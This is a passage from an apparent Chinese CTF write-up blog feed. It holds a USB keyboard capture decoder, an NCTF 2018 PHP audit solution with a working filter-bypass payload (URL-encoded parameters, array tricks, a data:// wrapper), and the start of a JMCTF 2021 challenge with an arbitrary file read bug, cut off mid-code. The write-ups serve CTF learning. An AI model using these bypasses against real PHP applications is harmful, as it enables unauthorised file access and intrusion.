class="token punctuation">,</span><span class="token string">"31"</span><span class="token punctuation">:</span><span class="token string">"\\"</span><span class="token punctuation">,</span><span class="token string">"32"</span><span class="token punctuation">:</span><span class="token string">"&lt;NON&gt;"</span><span class="token punctuation">,</span><span class="token string">"33"</span><span class="token punctuation">:</span><span class="token string">";"</span><span class="token punctuation">,</span><span class="token string">"34"</span><span class="token punctuation">:</span><span class="token string">"'"</span><span class="token punctuation">,</span><span class="token string">"35"</span><span class="token punctuation">:</span><span class="token string">"&lt;GA&gt;"</span><span class="token punctuation">,</span><span class="token string">"36"</span><span class="token punctuation">:</span><span class="token string">","</span><span class="token punctuation">,</span><span class="token string">"37"</span><span class="token punctuation">:</span><span class="token string">"."</span><span class="token punctuation">,</span><span class="token string">"38"</span><span class="token punctuation">:</span><span class="token string">"/"</span><span class="token punctuation">,</span><span class="token string">"39"</span><span class="token punctuation">:</span><span class="token string">"&lt;CAP&gt;"</span><span class="token punctuation">,</span><span class="token string">"3a"</span><span class="token punctuation">:</span><span class="token string">"&lt;F1&gt;"</span><span class="token punctuation">,</span><span class="token string">"3b"</span><span class="token punctuation">:</span><span class="token string">"&lt;F2&gt;"</span><span class="token punctuation">,</span> <span class="token string">"3c"</span><span class="token punctuation">:</span><span class="token string">"&lt;F3&gt;"</span><span class="token punctuation">,</span><span class="token string">"3d"</span><span class="token punctuation">:</span><span class="token string">"&lt;F4&gt;"</span><span class="token punctuation">,</span><span class="token string">"3e"</span><span class="token punctuation">:</span><span class="token string">"&lt;F5&gt;"</span><span class="token punctuation">,</span><span class="token string">"3f"</span><span class="token punctuation">:</span><span class="token string">"&lt;F6&gt;"</span><span class="token punctuation">,</span><span class="token string">"40"</span><span class="token punctuation">:</span><span class="token string">"&lt;F7&gt;"</span><span class="token punctuation">,</span><span class="token string">"41"</span><span class="token punctuation">:</span><span class="token string">"&lt;F8&gt;"</span><span class="token punctuation">,</span><span class="token string">"42"</span><span class="token punctuation">:</span><span class="token string">"&lt;F9&gt;"</span><span class="token punctuation">,</span><span class="token string">"43"</span><span class="token punctuation">:</span><span class="token string">"&lt;F10&gt;"</span><span class="token punctuation">,</span><span class="token string">"44"</span><span class="token punctuation">:</span><span class="token string">"&lt;F11&gt;"</span><span class="token punctuation">,</span><span class="token string">"45"</span><span class="token punctuation">:</span><span class="token string">"&lt;F12&gt;"</span><span class="token punctuation">}</span>shiftKeys <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"04"</span><span class="token punctuation">:</span><span class="token string">"A"</span><span class="token punctuation">,</span> <span class="token string">"05"</span><span class="token punctuation">:</span><span class="token string">"B"</span><span class="token punctuation">,</span> <span class="token string">"06"</span><span class="token punctuation">:</span><span class="token string">"C"</span><span class="token punctuation">,</span> <span class="token string">"07"</span><span class="token punctuation">:</span><span class="token string">"D"</span><span class="token punctuation">,</span> <span class="token string">"08"</span><span class="token punctuation">:</span><span class="token string">"E"</span><span class="token punctuation">,</span> <span class="token string">"09"</span><span class="token punctuation">:</span><span class="token string">"F"</span><span class="token punctuation">,</span> <span class="token string">"0a"</span><span class="token punctuation">:</span><span class="token string">"G"</span><span class="token punctuation">,</span> <span class="token string">"0b"</span><span class="token punctuation">:</span><span class="token string">"H"</span><span class="token punctuation">,</span> <span class="token string">"0c"</span><span class="token punctuation">:</span><span class="token string">"I"</span><span class="token punctuation">,</span> <span class="token string">"0d"</span><span class="token punctuation">:</span><span class="token string">"J"</span><span class="token punctuation">,</span> <span class="token string">"0e"</span><span class="token punctuation">:</span><span class="token string">"K"</span><span class="token punctuation">,</span> <span class="token string">"0f"</span><span class="token punctuation">:</span><span class="token string">"L"</span><span class="token punctuation">,</span> <span class="token string">"10"</span><span class="token punctuation">:</span><span class="token string">"M"</span><span class="token punctuation">,</span> <span class="token string">"11"</span><span class="token punctuation">:</span><span class="token string">"N"</span><span class="token punctuation">,</span> <span class="token string">"12"</span><span class="token punctuation">:</span><span class="token string">"O"</span><span class="token punctuation">,</span> <span class="token string">"13"</span><span class="token punctuation">:</span><span class="token string">"P"</span><span class="token punctuation">,</span> <span class="token string">"14"</span><span class="token punctuation">:</span><span class="token string">"Q"</span><span class="token punctuation">,</span> <span class="token string">"15"</span><span class="token punctuation">:</span><span class="token string">"R"</span><span class="token punctuation">,</span> <span class="token string">"16"</span><span class="token punctuation">:</span><span class="token string">"S"</span><span class="token punctuation">,</span> <span class="token string">"17"</span><span class="token punctuation">:</span><span class="token string">"T"</span><span class="token punctuation">,</span> <span class="token string">"18"</span><span class="token punctuation">:</span><span class="token string">"U"</span><span class="token punctuation">,</span> <span class="token string">"19"</span><span class="token punctuation">:</span><span class="token string">"V"</span><span class="token punctuation">,</span> <span class="token string">"1a"</span><span class="token punctuation">:</span><span class="token string">"W"</span><span class="token punctuation">,</span> <span class="token string">"1b"</span><span class="token punctuation">:</span><span class="token string">"X"</span><span class="token punctuation">,</span> <span class="token string">"1c"</span><span class="token punctuation">:</span><span class="token string">"Y"</span><span class="token punctuation">,</span> <span class="token string">"1d"</span><span class="token punctuation">:</span><span class="token string">"Z"</span><span class="token punctuation">,</span><span class="token string">"1e"</span><span class="token punctuation">:</span><span class="token string">"!"</span><span class="token punctuation">,</span> <span class="token string">"1f"</span><span class="token punctuation">:</span><span class="token string">"@"</span><span class="token punctuation">,</span> <span class="token string">"20"</span><span class="token punctuation">:</span><span class="token string">"#"</span><span class="token punctuation">,</span> <span class="token string">"21"</span><span class="token punctuation">:</span><span class="token string">"$"</span><span class="token punctuation">,</span> <span class="token string">"22"</span><span class="token punctuation">:</span><span class="token string">"%"</span><span class="token punctuation">,</span> <span class="token string">"23"</span><span class="token punctuation">:</span><span class="token string">"^"</span><span class="token punctuation">,</span><span class="token string">"24"</span><span class="token punctuation">:</span><span class="token string">"&amp;"</span><span class="token punctuation">,</span><span class="token string">"25"</span><span class="token punctuation">:</span><span class="token string">"*"</span><span class="token punctuation">,</span><span class="token string">"26"</span><span class="token punctuation">:</span><span class="token string">"("</span><span class="token punctuation">,</span><span class="token string">"27"</span><span class="token punctuation">:</span><span class="token string">")"</span><span class="token punctuation">,</span><span class="token string">"28"</span><span class="token punctuation">:</span><span class="token string">"&lt;RET&gt;"</span><span class="token punctuation">,</span><span class="token string">"29"</span><span class="token punctuation">:</span><span class="token string">"&lt;ESC&gt;"</span><span class="token punctuation">,</span><span class="token string">"2a"</span><span class="token punctuation">:</span><span class="token string">"&lt;DEL&gt;"</span><span class="token punctuation">,</span> <span class="token string">"2b"</span><span class="token punctuation">:</span><span class="token string">"\t"</span><span class="token punctuation">,</span><span class="token string">"2c"</span><span class="token punctuation">:</span><span class="token string">"&lt;SPACE&gt;"</span><span class="token punctuation">,</span><span class="token string">"2d"</span><span class="token punctuation">:</span><span class="token string">"_"</span><span class="token punctuation">,</span><span class="token string">"2e"</span><span class="token punctuation">:</span><span class="token string">"+"</span><span class="token punctuation">,</span><span class="token string">"2f"</span><span class="token punctuation">:</span><span class="token string">"{"</span><span class="token punctuation">,</span><span class="token string">"30"</span><span class="token punctuation">:</span><span class="token string">"}"</span><span class="token punctuation">,</span><span class="token string">"31"</span><span class="token punctuation">:</span><span class="token string">"|"</span><span class="token punctuation">,</span><span class="token string">"32"</span><span class="token punctuation">:</span><span class="token string">"&lt;NON&gt;"</span><span class="token punctuation">,</span><span class="token string">"33"</span><span class="token punctuation">:</span><span class="token string">"\""</span><span class="token punctuation">,</span><span class="token string">"34"</span><span class="token punctuation">:</span><span class="token string">":"</span><span class="token punctuation">,</span><span class="token string">"35"</span><span class="token punctuation">:</span><span class="token string">"&lt;GA&gt;"</span><span class="token punctuation">,</span><span class="token string">"36"</span><span class="token punctuation">:</span><span class="token string">"&lt;"</span><span class="token punctuation">,</span><span class="token string">"37"</span><span class="token punctuation">:</span><span class="token string">"&gt;"</span><span class="token punctuation">,</span><span class="token string">"38"</span><span class="token punctuation">:</span><span class="token string">"?"</span><span class="token punctuation">,</span><span class="token string">"39"</span><span class="token punctuation">:</span><span class="token string">"&lt;CAP&gt;"</span><span class="token punctuation">,</span><span class="token string">"3a"</span><span class="token punctuation">:</span><span class="token string">"&lt;F1&gt;"</span><span class="token punctuation">,</span><span class="token string">"3b"</span><span class="token punctuation">:</span><span class="token string">"&lt;F2&gt;"</span><span class="token punctuation">,</span> <span class="token string">"3c"</span><span class="token punctuation">:</span><span class="token string">"&lt;F3&gt;"</span><span class="token punctuation">,</span><span class="token string">"3d"</span><span class="token punctuation">:</span><span class="token string">"&lt;F4&gt;"</span><span class="token punctuation">,</span><span class="token string">"3e"</span><span class="token punctuation">:</span><span class="token string">"&lt;F5&gt;"</span><span class="token punctuation">,</span><span class="token string">"3f"</span><span class="token punctuation">:</span><span class="token string">"&lt;F6&gt;"</span><span class="token punctuation">,</span><span class="token string">"40"</span><span class="token punctuation">:</span><span class="token string">"&lt;F7&gt;"</span><span class="token punctuation">,</span><span class="token string">"41"</span><span class="token punctuation">:</span><span class="token string">"&lt;F8&gt;"</span><span class="token punctuation">,</span><span class="token string">"42"</span><span class="token punctuation">:</span><span class="token string">"&lt;F9&gt;"</span><span class="token punctuation">,</span><span class="token string">"43"</span><span class="token punctuation">:</span><span class="token string">"&lt;F10&gt;"</span><span class="token punctuation">,</span><span class="token string">"44"</span><span class="token punctuation">:</span><span class="token string">"&lt;F11&gt;"</span><span class="token punctuation">,</span><span class="token string">"45"</span><span class="token punctuation">:</span><span class="token string">"&lt;F12&gt;"</span><span class="token punctuation">}</span>output <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>keys <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'usbdata.txt'</span><span class="token punctuation">)</span><span class="token keyword">for</span> line <span class="token keyword">in</span> keys<span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> line<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> <span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">and</span> line<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'2'</span><span class="token punctuation">)</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">"00"</span><span class="token punctuation">:</span>             <span class="token keyword">continue</span>        <span class="token keyword">if</span> line<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token keyword">in</span> normalKeys<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            output <span class="token operator">+=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span>normalKeys<span class="token punctuation">[</span>line<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>shiftKeys<span class="token punctuation">[</span>line<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span>line<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'2'</span><span class="token punctuation">]</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            output <span class="token operator">+=</span> <span class="token punctuation">[</span><span class="token string">'[unknown]'</span><span class="token punctuation">]</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span>keys<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>flag<span class="token operator">=</span><span class="token number">0</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        a<span class="token operator">=</span>output<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">'&lt;DEL&gt;'</span><span class="token punctuation">)</span>        <span class="token keyword">del</span> output<span class="token punctuation">[</span>a<span class="token punctuation">]</span>        <span class="token keyword">del</span> output<span class="token punctuation">[</span>a<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> output<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">"&lt;CAP&gt;"</span><span class="token punctuation">:</span>            flag<span class="token operator">+=</span><span class="token number">1</span>            output<span class="token punctuation">.</span>pop<span class="token punctuation">(</span>i<span class="token punctuation">)</span>            <span class="token keyword">if</span> flag<span class="token operator">==</span><span class="token number">2</span><span class="token punctuation">:</span>                flag<span class="token operator">=</span><span class="token number">0</span>        <span class="token keyword">if</span> flag<span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">:</span>            output<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>output<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'output :'</span> <span class="token operator">+</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> NISACTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NCTF 2018</title>
      <link href="/2023/01/21/catchtheflag/games/nctf/nctf-2018/"/>
      <url>/2023/01/21/catchtheflag/games/nctf/nctf-2018/</url>
      
        <content type="html"><![CDATA[<h1 id="NCTF-2018"><a href="#NCTF-2018" class="headerlink" title="NCTF 2018"></a>NCTF 2018</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="1-Easy-Audit"><a href="#1-Easy-Audit" class="headerlink" title="1. Easy_Audit"></a>1. Easy_Audit</h3><p>#变量覆盖 #PHP伪协议 #正则绕过</p><ul><li>题目描述</li></ul><p>源码都有了，还要什么自行车</p><ul><li>题目解析</li></ul><p>获得源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$_REQUEST</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=&gt;</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-zA-Z]/i'</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'waf..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>  <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/yulige|flag|nctf/i'</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'waf..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'yulige'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'yulige'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'yulige'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>         <span class="token comment">//日爆md5!!!!!!        die('waf..');  </span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>          <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/nctfisfun$/'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nctf'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nctf'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'nctfisfun'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$getflag</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>          <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$getflag</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$getflag</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'ccc_liubi'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>              <span class="token keyword">include</span> <span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span>              <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'waf..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>绕过 $_REQUEST</li></ul><p>$_REQUEST 用来获取通过 COOKIE，GET，POST 方式传入的值</p><p>且优先级为 POST &gt; GET &gt; COOKIE</p><p>所以这里通过 GET 方式传入参数的同时使用 POST 传入同样的参数这时 $_REQUEST 获取到的为 POST 传入的参数即可实现绕过</p><ul><li>绕过 $_SERVER[‘QUERY_STRING’]</li></ul><p>$_SERVER[‘QUERY_STRING’] 匹配的是原始数据，就是没有 url 解码过的数据，所以可以使用 url 编码绕过</p><ul><li>绕过 if 判断</li></ul><p>substr 与 md5 一样在处理数组时都会返回 FALSE</p><ul><li>绕过 file_get_contents</li></ul><p>由于已经 POST 上去值了，不能使用 php://input 那就调用 data://text/plain;</p><p>最后构造 payload</p><pre class="line-numbers language-none"><code class="language-none">[GET]?%79%75%6C%69%67%65[]=1&amp;%6e%63%74%66=%6e%63%74%66%69%73%66%75%6e%0a&amp;%66%6c%61%67=data://text/plain,ccc_liubi[POST]yulige=1&amp;nctf=2&amp;flag=1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> NCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JMCTF 2021</title>
      <link href="/2023/01/21/catchtheflag/games/jmctf/jmctf-2021/"/>
      <url>/2023/01/21/catchtheflag/games/jmctf/jmctf-2021/</url>
      
        <content type="html"><![CDATA[<h1 id="JMCTF-2021"><a href="#JMCTF-2021" class="headerlink" title="JMCTF 2021"></a>JMCTF 2021</h1><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="1-GoOSS"><a href="#1-GoOSS" class="headerlink" title="1. GoOSS"></a>1. GoOSS</h3><p>#302重定向</p><ul><li>题目描述</li></ul><p>无</p><ul><li>题目解析</li></ul><p>从源码中可知在 80 端口开放了一个 php 文件，可以进行任意文件读取</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">// index.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">// php in localhost port 80</span><span class="token function">readfile</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在 1234 端口开放了一个 go</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token comment">// main.go</span><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span><span class="token string">"bytes"</span><span class="token string">"crypto/md5"</span><span class="token string">"encoding/hex"</span><span class="token string">"github.com/gin-gonic/gin"</span><span class="token string">"io"</span><span class="token string">"io/ioutil"</span><span class="token string">"net/http"</span><span class="token string">"os"</span><span class="token string">"strings"</span><span class="token string">"time"</span><span class="token punctuation">)</span><span class="token keyword">type</span> File <span class="token keyword">struct</span> <span class="token punctuation">{</span>Content <span class="token builtin">string</span> <span class="token string">`json:"content" binding:"required"`</span>Name    <span class="token builtin">string</span> <span class="token string">`json:"name" binding:"required"`</span><span class="token punctuation">}</span><span class="token keyword">type</span> Url <span class="token keyword">struct</span> <span class="token punctuation">{</span>Url <span class="token builtin">string</span> <span class="token string">`json:"url" binding:"required"`</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">md5sum</span><span class="token punctuation">(</span>data <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token builtin">string</span> <span class="token punctuation">{</span>s <span class="token operator">:=</span> md5<span class="token punctuation">.</span><span class="token function">Sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">return</span> hex<span class="token punctuation">.</span><span class="token function">EncodeToString</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">fileMidderware</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">{</span>fileSystem <span class="token operator">:=</span> http<span class="token punctuation">.</span><span class="token function">Dir</span><span class="token punctuation">(</span><span class="token string">"./files/"</span><span class="token punctuation">)</span><span class="token keyword">if</span> c<span class="token punctuation">.</span>Request<span class="token punctuation">.</span>URL<span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"/"</span> <span class="token punctuation">{</span>c<span class="token punctuation">.</span><span class="token function">Next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">}</span>f<span class="token punctuation">,</span> err <span class="token operator">:=</span> fileSystem<span class="token punctuation">.</span><span class="token function">Open</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>Request<span class="token punctuation">.</span>URL<span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> f <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>c<span class="token punctuation">.</span><span class="token function">Next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token comment">//</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>c<span class="token punctuation">.</span><span class="token function">Next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">}</span><span class="token keyword">defer</span> f<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>fi<span class="token punctuation">,</span> err <span class="token operator">:=</span> f<span class="token punctuation">.</span><span class="token function">Stat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>StatusInternalServerError<span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">{</span><span class="token string">"error"</span><span class="token punctuation">:</span> err<span class="token punctuation">.</span><span class="token function">Error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">}</span><span class="token keyword">if</span> fi<span class="token punctuation">.</span><span class="token function">IsDir</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token operator">!</span>strings<span class="token punctuation">.</span><span class="token function">HasSuffix</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>Request<span class="token punctuation">.</span>URL<span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"/"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>c<span class="token punctuation">.</span><span class="token function">Redirect</span><span class="token 